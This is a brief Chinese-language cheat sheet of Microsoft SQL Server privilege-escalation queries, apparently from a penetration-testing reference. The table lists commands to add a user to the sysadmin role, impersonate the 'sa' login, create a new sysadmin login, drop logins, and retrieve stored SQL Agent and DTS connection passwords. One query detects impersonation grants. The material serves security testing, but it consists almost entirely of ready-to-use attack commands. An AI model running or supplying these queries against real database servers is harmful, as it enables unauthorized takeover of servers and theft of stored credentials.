## 提权

|描述|查询语句|
|----|----|
|使用户成为DBA|EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';|
|模拟登录|EXECUTE AS LOGIN = 'sa'; SELECT @@VERSION;|
|创建系统管理员用户|EXEC sp_addlogin 'user', 'pass';<br>EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin';|
|删除用户|EXEC sp_droplogin 'user';|
|检索SQL代理连接密码|exec msdb.dbo.sp_get_sqlagent_properties|
|检索DTS连接密码|select msdb.dbo.rtbldmbprops|
|检测模拟登录|SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'|
